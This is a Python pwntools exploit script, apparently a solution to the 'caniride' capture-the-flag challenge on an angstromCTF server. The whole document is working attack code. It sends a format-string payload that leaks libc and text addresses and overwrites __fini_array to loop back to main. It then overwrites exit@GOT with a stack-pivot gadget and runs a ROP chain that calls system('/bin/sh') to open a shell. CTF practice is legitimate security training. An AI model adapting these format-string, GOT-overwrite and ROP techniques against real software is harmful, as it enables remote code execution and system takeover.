from pwn import *

#r = process("./caniride", env={"LD_PRELOAD":"./libc.so.6"})
r = remote("challs.actf.co", 31228)

e = ELF("./caniride")
l = ELF("./libc.so.6")

def build_fmt_payload(writes: dict, written=0) -> bytes:
    ws = sorted(writes.items(), key=lambda t: t[1])
    s = ""
    for offset, val in ws:
        assert val - written >= 0, "wtf"
        s += f"%{val - written}c"
        t = "hhn" if val - written < 256 else "hn"
        s += f"%{offset}${t}"
        written += val - written
    return s.encode()

# Name is fmt payload
# Leak libc at offset 143 and overwrite func pointer in __fini_array at offset 16 to main
name = b"AAAA%143$16lxBBBB" + build_fmt_payload({16 : 0x69}, 4 + 16 + 4)
r.sendlineafter(b"Name: ", name)
# Negative index driver to leak text base
r.sendlineafter(b"driver: ", b"-3")
r.recvuntil(b"this is ")
text = u64(r.recv(6) + b"\0\0") - e.symbols["__dso_handle"]
print("text: " + hex(text))
# Put __fini_array address in big buffer
r.sendlineafter(b"yourself: ", p64(text + 0x3300))
# Get leak value from fmt
r.recvuntil(b"AAAA")
libc = int(r.recv(16), 16) - 0x240b3
print("libc: " + hex(libc))
pop_rdi_ret = libc+ 0x23b72
ret = libc + 0x23b73
add_rsp_ret = libc + 0x86838
bin_sh = libc + 0x1b45bd
system = libc + l.symbols["system"]
exit_got = text + e.got["exit"]

# Back to main, overwrite exit@GOT to add rsp, 0xd8 and ROP
name = build_fmt_payload({16: add_rsp_ret & 0xFF, 17: (add_rsp_ret >> 8) & 0xFF, 18: (add_rsp_ret >> 16) & 0xFF}, 0)
r.sendlineafter(b"Name: ", name)
r.sendlineafter(b"driver: ", b"0")

payload = p64(exit_got) + p64(exit_got + 1) + p64(exit_got + 2)
payload += p64(ret) * 49
payload += p64(pop_rdi_ret) + p64(bin_sh)
payload += p64(system)
r.sendlineafter(b"yourself: ", payload)

r.interactive()
